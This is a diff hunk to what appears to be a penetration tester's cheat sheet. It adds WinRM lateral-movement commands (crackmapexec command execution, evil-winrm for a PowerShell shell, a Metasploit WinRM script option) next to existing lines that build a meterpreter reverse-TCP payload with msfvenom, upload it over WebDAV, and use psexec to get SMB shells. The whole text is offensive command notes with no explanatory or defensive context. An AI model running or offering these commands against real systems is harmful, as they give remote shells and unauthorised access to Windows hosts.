@@ -14,6 +14,11 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST= my_ip LPORT=1234 -f asp > pay
 set payload windows/metrepreter/reverse_tcp 
 iis upload // make sure to set Path /webdavdir/payload
 
+WINRM -
+crackmapexec winrm ip -u user -p pass // -x "command"
+evil-winrm.rb -u user -p pass -i ip // gets powershell shell 
+wimrm_script // MSF  set FORCE_VBS true
+
 SMB -
 psexec.py user@ip cmd.exe // psawns cmd shell
 exploit/windows/psexec //MSF 
